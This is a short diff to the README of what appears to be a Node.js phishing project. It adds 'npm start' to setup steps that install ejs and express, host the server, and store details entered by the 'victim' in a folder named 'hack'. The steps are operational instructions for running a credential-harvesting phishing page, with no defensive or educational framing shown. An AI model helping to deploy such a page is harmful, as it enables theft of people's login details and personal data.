@@ -17,7 +17,7 @@ Steps to do ==>
   2. Execute these Commnands in the folder where the Phshing Attack is kept ==>
      1. npm i ejs
      2. npm i express
-  3. Host the Node JS Server
+  3. Host the Node JS Server. [Use `npm start` to start the server]
   4. The Details when entered by victim will be immidiately saved in the folder named "hack"
 
 
